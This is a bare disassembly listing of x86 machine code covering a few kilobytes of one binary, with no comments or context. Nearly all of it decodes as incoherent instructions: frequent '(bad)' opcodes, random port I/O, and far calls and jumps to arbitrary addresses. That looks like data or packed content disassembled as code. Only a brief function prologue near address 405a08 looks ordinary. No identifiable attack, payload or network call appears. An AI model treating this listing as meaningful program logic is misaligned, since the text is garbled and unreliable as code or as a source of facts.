  4057d6:	test   BYTE PTR [ecx],dh
  4057d8:	pop    ebp
  4057d9:	inc    esi
  4057da:	sahf   
  4057db:	push   ebp
  4057dc:	fmul   st(1),st
  4057de:	adc    al,0xbf
  4057e0:	mov    ebp,0xb6c0c6ff
  4057e5:	pop    ecx
  4057e6:	or     bl,BYTE PTR [esi]
  4057e8:	(bad)  
  4057e9:	jns    0x405795
  4057eb:	mov    bl,0xac
  4057ed:	pushf  
  4057ee:	inc    ebp
  4057ef:	mov    dh,0x24
  4057f1:	sub    eax,0xe9bf10d0
  4057f6:	ret    
  4057f7:	clc    
  4057f8:	in     eax,0x8b
  4057fa:	dec    edx
  4057fb:	arpl   WORD PTR [ebx-0x2be547ef],sp
  405801:	sti    
  405802:	in     al,dx
  405803:	adc    eax,0x1d5dbb9d
  405808:	push   es
  405809:	add    DWORD PTR [ecx+0x79015a4],ebp
  40580f:	cmp    cl,BYTE PTR [esi]
  405811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405812:	and    DWORD PTR [ebp+0x6f],ebp
  405815:	jns    0x4057ca
  405817:	aam    0x92
  405819:	sbb    BYTE PTR [ebp-0x345eff7],al
  40581f:	mov    bh,0xd4
  405821:	mov    ds:0xa123b081,eax
  405826:	into   
  405827:	mov    ds:0x788235ce,eax
  40582c:	pop    edi
  40582d:	xor    DWORD PTR [edi],0x13
  405830:	dec    edi
  405831:	mov    dh,al
  405833:	ficom  DWORD PTR [ebp-0x1c9dfaf9]
  405839:	push   ecx
  40583a:	ds jb  0x4057d4
  40583d:	or     ebp,DWORD PTR [eax*1+0x17ba0bfa]
  405844:	fwait
  405845:	dec    sp
  405847:	adc    ch,BYTE PTR [edx+0x35f13197]
  40584d:	add    al,0x1d
  40584f:	jle    0x405859
  405851:	jl     0x4057dd
  405853:	fcmovu st,st(7)
  405855:	les    esi,FWORD PTR [edi+0x29b7573d]
  40585b:	xor    edi,esp
  40585d:	jg     0x4058c1
  40585f:	adc    cx,WORD PTR [ecx-0x58be55e6]
  405866:	jecxz  0x405817
  405868:	ret    0xbd70
  40586b:	mov    WORD PTR [eax],gs
  40586d:	out    dx,eax
  40586e:	mov    ds:0xd5c59545,eax
  405873:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405875:	mov    dh,0x33
  405877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405878:	aaa    
  405879:	ret    
  40587a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40587b:	jle    0x40586f
  40587d:	outs   dx,DWORD PTR ds:[esi]
  40587e:	fwait
  40587f:	(bad)  
  405880:	repz pop ebx
  405882:	push   ecx
  405883:	fs sub dl,bh
  405886:	popa   
  405887:	(bad)
  40588a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40588c:	aaa    
  40588d:	sub    BYTE PTR es:[esi+edx*2-0x46],0xa4
  405893:	arpl   WORD PTR [ebx+esi*2],bp
  405896:	neg    DWORD PTR [edi+0x1a]
  405899:	dec    eax
  40589a:	or     DWORD PTR [ebx],edi
  40589c:	cmp    al,0x90
  40589e:	test   DWORD PTR [edi],ebx
  4058a0:	mov    dl,0xe0
  4058a2:	push   ebp
  4058a3:	pop    es
  4058a4:	xchg   DWORD PTR [ebx],ebp
  4058a6:	cmp    al,0xec
  4058a8:	in     eax,dx
  4058a9:	pop    ss
  4058aa:	jns    0x4058cd
  4058ac:	out    0x30,eax
  4058ae:	nop
  4058af:	mov    bh,0x3e
  4058b1:	xchg   esi,eax
  4058b2:	sbb    DWORD PTR [esi],esp
  4058b4:	loop   0x4058ca
  4058b6:	scas   eax,DWORD PTR es:[edi]
  4058b7:	mov    ds:0xe2157f5e,eax
  4058bc:	ds jmp 0x4058a8
  4058bf:	mov    ebx,0xac1bae4
  4058c4:	rcl    BYTE PTR [edx+edi*2],1
  4058c7:	ret    
  4058c8:	or     bh,dl
  4058ca:	popa   
  4058cb:	scas   eax,DWORD PTR es:[edi]
  4058cc:	iret   
  4058cd:	addr16 rcr eax,cl
  4058d0:	cmc    
  4058d1:	daa    
  4058d2:	jbe    0x4058aa
  4058d4:	jo     0x405865
  4058d6:	(bad)  
  4058d7:	fild   QWORD PTR [edi-0x3899ed40]
  4058dd:	fimul  DWORD PTR [esi-0x1f1a076f]
  4058e3:	xchg   DWORD PTR [eax],ebx
  4058e5:	sti    
  4058e6:	xor    ebp,DWORD PTR [edi+0x63]
  4058e9:	cmc    
  4058ea:	cs inc esi
  4058ec:	jl     0x405898
  4058ee:	pop    edi
  4058ef:	enter  0xd281,0x2b
  4058f3:	loope  0x40591b
  4058f5:	xchg   esp,eax
  4058f6:	rcl    DWORD PTR [edi],1
  4058f8:	test   BYTE PTR [ebp+0x79],cl
  4058fb:	in     al,dx
  4058fc:	jmp    0x1049fe5e
  405901:	sbb    dl,BYTE PTR [edi-0x6505dd53]
  405907:	clc    
  405908:	lahf   
  405909:	imul   ebx,DWORD PTR [eax-0x7c],0x24000f7b
  405910:	add    DWORD PTR [edx+0x33a481b7],esi
  405916:	cmp    esi,DWORD PTR [edx]
  405918:	std    
  405919:	icebp  
  40591a:	fwait
  40591b:	popa   
  40591c:	out    0x92,al
  40591e:	pop    edi
  40591f:	cwde   
  405920:	js     0x40596e
  405922:	iret   
  405923:	test   DWORD PTR [esi],0x5d97e436
  405929:	aam    0x4b
  40592b:	pop    edi
  40592c:	push   esi
  40592d:	leave  
  40592e:	add    bl,dl
  405930:	or     eax,0x6ebf39c4
  405935:	mov    ebp,0x547d9f36
  40593a:	xchg   ebx,eax
  40593b:	(bad)  
  40593c:	sahf   
  40593d:	dec    esp
  40593e:	into   
  40593f:	lea    ebx,[eax-0x14]
  405942:	sub    edi,edi
  405944:	and    al,0xe1
  405946:	iret   
  405947:	xor    eax,0xe6dfb6ec
  40594c:	test   DWORD PTR [edi+0x6133db8a],0x744ea4d0
  405956:	data16 cmp BYTE PTR fs:[ebx-0x32df4237],0x5e
  40595f:	push   edx
  405960:	out    dx,al
  405961:	cmp    ecx,DWORD PTR ds:0x6d5fdd31
  405967:	sbb    esp,ebx
  405969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40596a:	fucomi st,st(4)
  40596c:	cwde   
  40596d:	add    BYTE PTR [esi+eax*2+0x558a2f3b],cl
  405974:	pop    edi
  405975:	psraw  mm3,mm2
  405978:	outs   dx,DWORD PTR ds:[esi]
  405979:	inc    edi
  40597a:	or     al,0xc8
  40597c:	mov    eax,0xeaf0aa68
  405981:	mov    bl,0xab
  405983:	mov    WORD PTR [esi+0x7f],fs
  405986:	inc    DWORD PTR [eax+0x9]
  405989:	les    edx,FWORD PTR ds:0xda8b5368
  40598f:	sar    DWORD PTR [esp+ebp*2-0x36],cl
  405993:	(bad)  
  405995:	jl     0x405930
  405997:	push   ebp
  405998:	retf   0xbb5b
  40599b:	mov    ss,WORD PTR [edx+0x65859a5f]
  4059a1:	popf   
  4059a2:	mov    ecx,0x6303a205
  4059a7:	cmp    esp,edx
  4059a9:	retf   0x32fc
  4059ac:	xchg   edi,eax
  4059ad:	cmp    DWORD PTR [edi+edx*4],edx
  4059b0:	add    BYTE PTR [esi-0x39],0xfe
  4059b4:	pushf  
  4059b5:	inc    ebp
  4059b6:	imul   ebp,DWORD PTR [edx-0x5],0xffffff84
  4059ba:	or     DWORD PTR ds:0x5f3500cd,ebx
  4059c0:	call   0x45e1:0xf2db240
  4059c7:	add    al,0x6b
  4059c9:	pusha  
  4059ca:	xchg   esi,eax
  4059cb:	cld    
  4059cc:	adc    BYTE PTR [edx+0x23],cl
  4059cf:	inc    esp
  4059d0:	pop    edx
  4059d1:	mov    cl,0x96
  4059d3:	jge    0x405a4f
  4059d5:	or     DWORD PTR [edx],ecx
  4059d7:	ja     0x4059b7
  4059d9:	pop    ss
  4059da:	in     al,0xdc
  4059dc:	pop    ds
  4059dd:	cmp    al,0x96
  4059df:	push   esi
  4059e0:	bound  edx,QWORD PTR [edi+0x3b1b0b55]
  4059e6:	mov    cl,0xad
  4059e8:	in     al,dx
  4059e9:	in     eax,dx
  4059ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059eb:	fcmove st,st(4)
  4059ed:	xchg   ecx,eax
  4059ee:	adc    DWORD PTR ds:0x1075038d,ecx
  4059f4:	cmp    edx,esi
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x405a5d
  405a20:	idiv   DWORD PTR [eax+0x78386793]
  405a26:	js     0x405a75
  405a28:	jle    0x405aa2
  405a2a:	js     0x4059cf
  405a2c:	cli    
  405a2d:	cmp    DWORD PTR [eax-0x2a28b3c4],eax
  405a33:	pop    ecx
  405a34:	mov    es,WORD PTR [ecx+0x3482df17]
  405a3a:	push   cs
  405a3b:	inc    ebp
  405a3c:	sub    DWORD PTR [edi+0x59],ebp
  405a3f:	ja     0x4059cb
  405a41:	icebp  
  405a42:	(bad)  
  405a43:	cld    
  405a44:	(bad)  
  405a45:	xchg   edx,eax
  405a46:	mov    ds:0xb28dea29,eax
  405a4b:	push   ebx
  405a4c:	ds shr edx,0x83
  405a50:	add    al,dh
  405a52:	lahf   
  405a53:	inc    ecx
  405a54:	jle    0x405acb
  405a56:	lods   al,BYTE PTR ds:[si]
  405a58:	stos   DWORD PTR es:[edi],eax
  405a59:	(bad)  
  405a5a:	sub    eax,0x796db8cc
  405a5f:	dec    ebp
  405a60:	cmp    DWORD PTR [esi+ecx*2-0x9],esp
  405a64:	and    ebp,esi
  405a66:	arpl   WORD PTR [ebx+0x208ecb18],cx
  405a6c:	adc    DWORD PTR [ebp+0x64],0xffe13397
  405a73:	daa    
  405a74:	xlat   BYTE PTR ds:[ebx]
  405a75:	jmp    0x602e:0x45b86f0b
  405a7c:	pop    edx
  405a7d:	xor    esi,ebx
  405a7f:	or     al,0xc0
  405a81:	mov    ch,0xdf
  405a83:	and    esi,DWORD PTR [edi]
  405a85:	or     dl,bl
  405a87:	add    al,dh
  405a89:	addr16 mov edx,0xbb47c7d
  405a8f:	mov    ecx,0x531e86e7
  405a94:	push   cs
  405a95:	adc    BYTE PTR [ebx+0x47],bl
  405a98:	aam    0x9
  405a9a:	pop    ebx
  405a9b:	(bad)
  405a9e:	push   es
  405a9f:	and    eax,0x4f8dda48
  405aa4:	(bad)  
  405aa5:	cmp    DWORD PTR [eax+0x33],edx
  405aa8:	jg     0x405adb
  405aaa:	imul   edi,edx,0x17
  405aad:	pop    eax
  405aae:	out    dx,eax
  405aaf:	mov    ds:0xf23b4a4a,al
  405ab4:	jae    0x405abe
  405ab6:	mov    dl,0x6d
  405ab8:	out    dx,al
  405ab9:	and    BYTE PTR [ebx],ah
  405abb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405abc:	enter  0xbdb6,0xc7
  405ac0:	sub    al,0x7f
  405ac2:	ins    DWORD PTR es:[edi],dx
  405ac3:	mov    WORD PTR [edx],?
  405ac5:	cwde   
  405ac6:	adc    BYTE PTR [esi],bl
  405ac8:	ins    BYTE PTR es:[edi],dx
  405ac9:	shl    BYTE PTR [ebx],0x8
  405acc:	repz inc ebx
  405ace:	jne    0x405ad3
  405ad0:	xor    DWORD PTR [eax+0x48a7dba9],0xc3715f7f
  405ada:	cld    
  405adb:	pop    edi
  405adc:	push   ds
  405add:	pop    es
  405ade:	imul   ebx,DWORD PTR [edx],0x36cb3c23
  405ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae5:	jecxz  0x405ad0
  405ae7:	adc    eax,DWORD PTR [edx+0x5dd07908]
  405aed:	pop    ss
  405aee:	mov    cl,0x2b
  405af0:	and    esp,ecx
  405af2:	add    al,BYTE PTR [ecx-0x326f7912]
  405af8:	push   ebp
  405af9:	ss test dh,dh
  405afc:	sar    DWORD PTR [eax-0x53],1
  405aff:	xchg   esi,eax
  405b00:	lea    ecx,[ebx+0x59faf2b3]
  405b06:	pop    esi
  405b07:	test   DWORD PTR [ebx+0x2a447cd1],ecx
  405b0d:	xlat   BYTE PTR ds:[ebx]
  405b0e:	push   0xffffffc7
  405b10:	dec    ebp
  405b11:	aaa    
  405b12:	call   0xba8c1e38
  405b17:	(bad)  
  405b18:	enter  0xb355,0xe9
  405b1c:	push   eax
  405b1d:	loop   0x405b52
  405b1f:	arpl   WORD PTR [ecx+eax*2-0x315bc536],ax
  405b26:	je     0x405afa
  405b28:	stc    
  405b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b2a:	push   0x85dc04ee
  405b2f:	es aas 
  405b31:	dec    eax
  405b32:	xchg   esp,eax
  405b33:	mov    gs,WORD PTR [ecx+0x811e8fa]
  405b39:	lods   eax,DWORD PTR ss:[esi]
  405b3b:	cmp    eax,0xb063741f
  405b40:	mov    eax,ds:0x780642a6
  405b45:	addr16 mov ah,bh
  405b48:	int3   
  405b49:	xchg   edx,eax
  405b4a:	test   eax,0xd23da8f4
  405b4f:	or     eax,0xf80f8025
  405b54:	test   al,0x56
  405b56:	mov    bl,0xd3
  405b58:	in     al,0x51
  405b5a:	out    dx,eax
  405b5b:	pop    esp
  405b5c:	test   BYTE PTR [eax+ebx*8],bl
  405b5f:	popa   
  405b60:	inc    esp
  405b61:	lahf   
  405b62:	arpl   WORD PTR [ebx+esi*8],ax
  405b65:	imul   ebp,DWORD PTR es:[ecx-0x10e9c5df],0xffffffdf
  405b6d:	repnz pop eax
  405b6f:	or     BYTE PTR [esi+0x13],0xbc
  405b73:	sub    esp,DWORD PTR [esi+0x58]
  405b76:	add    al,0x33
  405b78:	lods   al,BYTE PTR ds:[esi]
  405b79:	aas    
  405b7a:	mov    DWORD PTR [edx],ebp
  405b7c:	inc    esi
  405b7d:	add    BYTE PTR [edi+0x7f],0xd7
  405b81:	and    dl,dl
  405b83:	mov    al,ds:0x26870e30
  405b88:	push   0xfb46fa28
  405b8d:	mov    WORD PTR [edi+eiz*1-0x3a1761f3],cs
  405b94:	fidivr WORD PTR [ecx+edx*8-0xcae1c7f]
  405b9b:	push   cs
  405b9c:	mov    ecx,0xf674bd2c
  405ba1:	mov    bh,0xc9
  405ba3:	ss out dx,al
  405ba5:	aam    0x96
  405ba7:	add    ebp,0x3392adeb
  405bad:	shr    BYTE PTR ds:0x7df4d743,0x1d
  405bb4:	or     eax,0xfe0c32e0
  405bb9:	mov    ebx,DWORD PTR cs:[edx-0x48]
  405bbd:	push   ebx
  405bbe:	sub    bh,BYTE PTR [edi+0x59d8e588]
  405bc4:	cmc    
  405bc5:	fimul  DWORD PTR [esi+0x64d1ef5a]
  405bcb:	gs dec edx
  405bcd:	push   ds
  405bce:	mov    BYTE PTR [esi+eax*1],0xa6
  405bd2:	(bad)  
  405bd3:	stos   DWORD PTR es:[edi],eax
  405bd4:	mov    ah,0xdc
  405bd6:	push   esi
  405bd7:	mov    al,ds:0x9f9b029c
  405bdc:	lahf   
  405bdd:	cmp    BYTE PTR [ecx],0xfb
  405be0:	inc    eax
  405be1:	sub    al,0x63
  405be3:	icebp  
  405be4:	lahf   
  405be5:	bound  esp,QWORD PTR [ebx+0x47211d80]
  405beb:	call   0xd6c6:0x57ccdaae
  405bf2:	mov    bl,BYTE PTR [eax]
  405bf4:	cmp    al,0xbd
  405bf6:	loopne 0x405bb9
  405bf8:	push   ebp
  405bf9:	int    0xb
  405bfb:	add    ah,BYTE PTR [ebx]
  405bfd:	cmovp  eax,DWORD PTR [edx+0x86bddfe]
  405c04:	jo     0x405c3f
  405c06:	outs   dx,BYTE PTR ds:[esi]
  405c07:	stos   DWORD PTR es:[edi],eax
  405c08:	aaa    
  405c09:	out    0xa5,al
  405c0b:	sub    DWORD PTR [ecx-0x18],edi
  405c0e:	and    BYTE PTR [ebx],al
  405c10:	repz jg 0x405c04
  405c13:	mov    ebp,0xeed6462f
  405c18:	sbb    BYTE PTR [ebx],cl
  405c1a:	sbb    edi,DWORD PTR [edx]
  405c1c:	dec    edi
  405c1d:	dec    edi
  405c1e:	data16 (bad) 
  405c20:	iret   
  405c21:	aas    
  405c22:	imul   esi,DWORD PTR [edx-0x19c44090],0xffffffdf
  405c29:	ds mov dl,ah
  405c2c:	xor    esi,0xffffffac
  405c2f:	push   edx
  405c30:	sub    BYTE PTR [esi+esi*8],dl
  405c33:	test   eax,0x2d27be69
  405c38:	and    al,0xdf
  405c3a:	jnp    0x405c4d
  405c3c:	jb     0x405c41
  405c3e:	frstor [ecx]
  405c40:	push   esp
  405c41:	(bad)  
  405c42:	push   ebp
  405c43:	lods   eax,DWORD PTR ds:[esi]
  405c44:	jmp    0x405c1e
  405c46:	cmp    eax,0x58781568
  405c4b:	fstp   QWORD PTR [ecx+0xa]
  405c4e:	xchg   DWORD PTR [edi],esp
  405c50:	fucomip st,st(5)
  405c52:	ror    BYTE PTR [edi+0x5adaafa4],1
  405c58:	sub    BYTE PTR [ecx+edi*1],0x58
  405c5c:	sar    BYTE PTR [ebp-0x46],0x9a
  405c60:	push   esi
  405c61:	pop    ebx
  405c62:	out    dx,al
  405c63:	imul   ebp,DWORD PTR [ebp+0x43],0x554e65ab
  405c6a:	dec    esp
  405c6b:	dec    eax
  405c6c:	and    BYTE PTR [ebx+eiz*4],bl
  405c6f:	stos   BYTE PTR es:[edi],al
  405c70:	or     edx,DWORD PTR [ecx+0x34]
  405c73:	scas   al,BYTE PTR es:[edi]
  405c74:	add    BYTE PTR [edx+0x3e0e1c5b],0x2d
  405c7b:	sub    al,0x49
  405c7d:	call   0x9f1ee1ff
  405c82:	push   esi
  405c83:	int    0x58
  405c85:	pusha  
  405c86:	ins    BYTE PTR es:[edi],dx
  405c87:	test   al,0x3b
  405c89:	nop
  405c8a:	and    eax,edx
  405c8c:	add    eax,0x3103538
  405c91:	mov    edx,0xefed159e
  405c96:	stos   DWORD PTR es:[edi],eax
  405c97:	dec    ebp
  405c98:	cmp    DWORD PTR [edx+0x59cafc26],edx
  405c9e:	mov    edi,0x637b629d
  405ca3:	sbb    BYTE PTR [esi-0x7ca95ac3],cl
  405ca9:	mov    ds:0x80e1b468,eax
  405cae:	xchg   esi,eax
  405caf:	or     DWORD PTR [edx-0x18],ebp
  405cb2:	dec    ebp
  405cb3:	dec    eax
  405cb4:	cmc    
  405cb5:	lds    ecx,FWORD PTR [ebp-0x44]
  405cb8:	pushf  
  405cb9:	sub    dh,BYTE PTR [esi+0x691b20cc]
  405cbf:	frndint 
  405cc1:	loopne 0x405d07
  405cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cc4:	dec    eax
  405cc5:	pop    edi
  405cc6:	je     0x405d07
  405cc8:	cmp    DWORD PTR [edi-0x600d68b6],edi
  405cce:	dec    esi
  405ccf:	(bad)  
  405cd0:	adc    al,0xbb
  405cd2:	lock cs repnz add edx,ebp
  405cd7:	sar    BYTE PTR [esp+eax*8+0x2c3210d9],0x82
  405cdf:	and    BYTE PTR ds:0x2c88a825,0xa
  405ce6:	pusha  
  405ce7:	mov    BYTE PTR [edx-0x58],dh
  405cea:	mov    esi,0x72860e4c
  405cef:	aas    
  405cf0:	cmp    al,0xe7
  405cf2:	adc    ecx,esi
  405cf4:	repnz imul ecx,DWORD PTR [edi],0xa46c9323
  405cfb:	adc    ebx,DWORD PTR [ebx-0x162dcced]
  405d01:	jmp    0x405d05
  405d03:	add    BYTE PTR [eax],al
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xad2d4c09
  405d13:	ins    BYTE PTR es:[edi],dx
  405d14:	je     0x405cca
  405d16:	cmp    eax,0x7e4d7878
  405d1b:	js     0x405d95
  405d1d:	inc    ebx
  405d1e:	push   eax
  405d1f:	push   ecx
  405d20:	mov    al,0xcd
  405d22:	cmc    
  405d23:	cwde   
  405d24:	sub    eax,0x2a156a1e
  405d29:	hlt    
  405d2a:	(bad)  
  405d2b:	popa   
  405d2c:	data16 (bad) 
  405d2e:	aaa    
  405d2f:	or     DWORD PTR [ebx-0x5f2a784a],ecx
  405d35:	aas    
  405d36:	pop    ecx
  405d37:	scas   eax,DWORD PTR es:[edi]
  405d38:	push   es
  405d39:	xchg   ebx,eax
  405d3a:	mov    edx,DWORD PTR [esi+ebp*8-0x608300d7]
  405d41:	dec    edx
  405d42:	xchg   edx,eax
  405d43:	fcomp  DWORD PTR [esi-0x33]
  405d46:	and    eax,0x924bd65a
  405d4b:	scas   al,BYTE PTR es:[edi]
  405d4c:	mov    esi,0xb86a637d
  405d51:	jg     0x405d13
  405d53:	pop    ds
  405d54:	mov    edi,0x62c6bea4
  405d59:	mov    esi,0x13f44faf
  405d5e:	jb     0x405d95
  405d60:	add    al,0x6f
  405d62:	lahf   
  405d63:	test   eax,0xd300b689
  405d68:	xchg   ebp,eax
  405d69:	mov    bh,0x97
  405d6b:	jg     0x405d3c
  405d6d:	mov    ecx,0x1fd8a3a3
  405d72:	imul   edx,ecx,0x39432345
  405d78:	inc    eax
  405d79:	scas   al,BYTE PTR es:[edi]
  405d7a:	fldcw  WORD PTR [ecx-0x25ad2c01]
  405d80:	mov    WORD PTR [edx-0x17d380d8],?
  405d86:	jb     0x405d25
  405d88:	inc    ebp
  405d89:	pop    ds
  405d8a:	cmp    BYTE PTR [edx],bh
  405d8c:	or     ecx,esp
  405d8e:	mov    al,ds:0xf46c7c16
  405d93:	(bad)  
  405d94:	out    dx,al
  405d95:	(bad)  
  405d96:	hlt    
  405d97:	das    
  405d98:	popa   
  405d99:	mov    al,0x75
  405d9b:	and    eax,0x6edc6caf
  405da0:	sub    dh,BYTE PTR ds:0x300cf9fb
  405da6:	ss sbb eax,0x57d4ba64
  405dac:	daa    
  405dad:	aam    0x59
  405daf:	sbb    eax,0xc91287ce
  405db4:	pop    edx
  405db5:	xor    al,0xa3
  405db7:	outs   dx,DWORD PTR ds:[esi]
  405db8:	xor    eax,0x63116c7d
  405dbd:	and    ebx,DWORD PTR [ebp-0x66430fdc]
  405dc3:	add    edi,DWORD PTR ds:0x6909a4cd
  405dc9:	pop    ebp
  405dca:	jle    0x405e45
  405dcc:	mov    eax,ecx
  405dce:	mov    dl,0xa2
  405dd0:	fidivr DWORD PTR [ebx-0x3a65b85b]
  405dd6:	add    ebx,DWORD PTR [eax-0x3d]
  405dd9:	mul    DWORD PTR [ebx+0x61]
  405ddc:	dec    esp
  405ddd:	dec    ebp
  405dde:	xor    edi,ebx
  405de0:	jmp    0x405e1f
  405de2:	inc    eax
  405de3:	out    0xc2,al
  405de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405de6:	out    dx,eax
  405de7:	push   eax
  405de8:	xor    BYTE PTR [edx+0x4],cl
  405deb:	mov    ds:0xb0d9b945,eax
  405df0:	int3   
  405df1:	test   al,0x1
  405df3:	pop    es
  405df4:	mov    ebx,0x82e25347
  405df9:	mov    ds:0x2426ca4b,al
  405dfe:	(bad)  
  405dff:	dec    esp
  405e00:	inc    edx
  405e01:	lock pop ds
  405e03:	mov    dl,0xeb
  405e05:	or     edi,ebp
  405e07:	xchg   di,ax
  405e09:	jmp    0x405e16
  405e0b:	pop    ebp
  405e0c:	fsubr  QWORD PTR [edi]
  405e0f:	pop    eax
  405e10:	gs mov edi,0x3ac09a4f
  405e16:	dec    eax
  405e17:	add    eax,0xb8ed5cab
  405e1c:	(bad)  
  405e1d:	push   ecx
  405e1e:	mov    ch,0x8c
  405e20:	mov    al,ds:0x3facbaef
  405e25:	cmc    
  405e26:	xlat   BYTE PTR ds:[ebx]
  405e27:	pop    esp
  405e28:	out    0xf3,eax
  405e2a:	dec    esp
  405e2b:	add    al,0x2c
  405e2d:	mov    edi,0xba117d09
  405e32:	fwait
  405e33:	je     0x405e3a
  405e35:	ins    DWORD PTR es:[edi],dx
  405e36:	dec    esp
  405e37:	xlat   BYTE PTR ds:[ebx]
  405e38:	sub    eax,0xef11f46
  405e3d:	mov    ebx,0xb6580e48
  405e42:	rol    BYTE PTR [eax*1-0x7c403345],cl
  405e49:	or     eax,ecx
  405e4b:	mov    al,ds:0xaaf5cb64
  405e50:	sub    ecx,DWORD PTR ds:0x253a4e90
  405e56:	popa   
  405e57:	test   eax,0xf91286f7
  405e5c:	(bad)  
  405e5d:	popf   
  405e5e:	xchg   esi,eax
  405e5f:	xor    dh,BYTE PTR [ebp-0x11]
  405e62:	ins    BYTE PTR es:[edi],dx
  405e63:	mov    ds:0x621b8694,al
  405e68:	mov    WORD PTR [edx-0x4e],?
  405e6b:	xchg   ebx,eax
  405e6c:	or     bl,dh
  405e6e:	(bad)
  405e73:	sti    
  405e74:	jne    0x405eba
  405e76:	or     eax,0xe4ad5748
  405e7b:	ins    BYTE PTR es:[edi],dx
  405e7c:	mov    ds,WORD PTR [edi-0x16]
  405e7f:	mov    cl,0x71
  405e81:	sub    edx,DWORD PTR [eax+ebx*4-0x5a7b3618]
  405e88:	out    0x27,eax
  405e8a:	cli    
  405e8b:	dec    esi
  405e8c:	mov    eax,0x62c1a00
  405e91:	jae    0x405e2b
  405e93:	imul   esp,DWORD PTR [eax],0x6bd4b158
  405e99:	xchg   esi,eax
  405e9a:	dec    esi
  405e9b:	jo     0x405ec2
  405e9d:	jne    0x405e81
  405e9f:	mov    es,WORD PTR [esi]
  405ea1:	jae    0x405ec5
  405ea3:	pop    eax
  405ea4:	push   edx
  405ea5:	test   DWORD PTR [edi],ebx
  405ea7:	in     eax,0x36
  405ea9:	mov    ch,0x89
  405eab:	dec    esi
  405eac:	xor    al,0xcc
  405eae:	add    DWORD PTR [esp+edi*2],edx
  405eb1:	fdivr  st(3),st
  405eb3:	jecxz  0x405f04
  405eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eb6:	or     cl,BYTE PTR [ecx-0x1e787fdc]
  405ebc:	aad    0x1d
  405ebe:	xor    eax,DWORD PTR [edx]
  405ec0:	dec    edi
  405ec1:	inc    edi
  405ec2:	jp     0x405ee6
  405ec4:	or     al,0xff
  405ec6:	enter  0x7185,0xe3
  405eca:	pushf  
  405ecb:	push   esp
  405ecc:	or     BYTE PTR [edx],bl
  405ece:	dec    edx
  405ecf:	pop    edi
  405ed0:	xlat   BYTE PTR ds:[ebx]
  405ed1:	sub    al,0xf9
  405ed3:	mov    BYTE PTR [ecx+0x11],dl
  405ed6:	mov    ecx,0x5a099278
  405edb:	cmp    al,0xe2
  405edd:	gs es hlt 
  405ee0:	pop    ebx
  405ee1:	out    dx,eax
  405ee2:	loope  0x405f0c
  405ee4:	dec    ecx
  405ee5:	inc    edi
  405ee6:	stc    
  405ee7:	pusha  
  405ee8:	stc    
  405ee9:	(bad)  
  405eea:	enter  0x79e4,0xeb
  405eee:	and    esp,edx
  405ef0:	adc    esi,DWORD PTR es:[eax+0xe9dae77]
  405ef7:	jo     0x405f1b
  405ef9:	fs in  eax,dx
  405efb:	retf   0x61c5
  405efe:	cmp    ebx,DWORD PTR [edx]
  405f00:	pop    ebp
  405f01:	adc    esp,DWORD PTR [edi+0x53]
  405f04:	jmp    0x405f2b
  405f06:	and    eax,0x96aaed12
  405f0b:	dec    esi
  405f0c:	cli    
  405f0d:	mov    edi,0x49460209
  405f12:	xchg   ebx,eax
  405f13:	or     edi,DWORD PTR [edi]
  405f15:	je     0x405f28
  405f17:	outs   dx,DWORD PTR ds:[esi]
  405f18:	sub    ch,0x2b
  405f1b:	or     dh,BYTE PTR [ecx]
  405f1d:	addr16 mov ecx,0x14811f0d
  405f23:	pusha  
  405f24:	jo     0x405eb5
  405f26:	xchg   esp,eax
  405f27:	ins    BYTE PTR es:[edi],dx
  405f28:	mov    eax,0x38bc293
  405f2d:	call   0x7859f6c8
  405f32:	sbb    eax,0xd79d6d1c
  405f37:	mov    ah,0x19
  405f39:	int3   
  405f3a:	dec    esp
  405f3b:	outs   dx,BYTE PTR ds:[esi]
  405f3c:	and    edx,DWORD PTR ds:0x60d49c2a
  405f42:	mov    cl,0xdc
  405f44:	fcom   DWORD PTR [ecx+edi*1-0x36]
  405f48:	lock (bad) 
  405f4b:	push   ds
  405f4c:	pop    es
  405f4d:	sbb    bh,cl
  405f4f:	sbb    eax,0x2a7606c5
  405f54:	cli    
  405f55:	or     al,0xba
  405f57:	pop    edx
  405f58:	lahf   
  405f59:	aas    
  405f5a:	cs mov ecx,0xc5e871f8
  405f60:	dec    esi
  405f61:	or     DWORD PTR [eax-0x5265ed11],edx
  405f67:	add    al,0x7f
  405f69:	neg    DWORD PTR [edi+esi*4+0x6b]
  405f6d:	inc    ebp
  405f6e:	dec    ecx
  405f6f:	stos   DWORD PTR es:[edi],eax
  405f70:	mov    eax,ds:0x146d99a7
  405f75:	rcr    DWORD PTR [esi+0x27a9d54c],cl
  405f7b:	aad    0xdd
  405f7d:	aaa    
  405f7e:	cmp    eax,0xae068c1d
  405f83:	scas   al,BYTE PTR es:[edi]
  405f84:	shl    DWORD PTR ds:0x6d72a542,1
  405f8a:	dec    esp
  405f8b:	sbb    ebx,0xeae38324
  405f91:	push   cs
  405f92:	popf   
  405f93:	arpl   cx,bx
  405f95:	xor    eax,0xad419901
  405f9a:	into   
  405f9b:	push   ds
  405f9c:	loope  0x40600e
  405f9e:	rcl    bl,0x33
  405fa1:	xor    eax,0xd3fda1fe
  405fa6:	sar    BYTE PTR [ebx],1
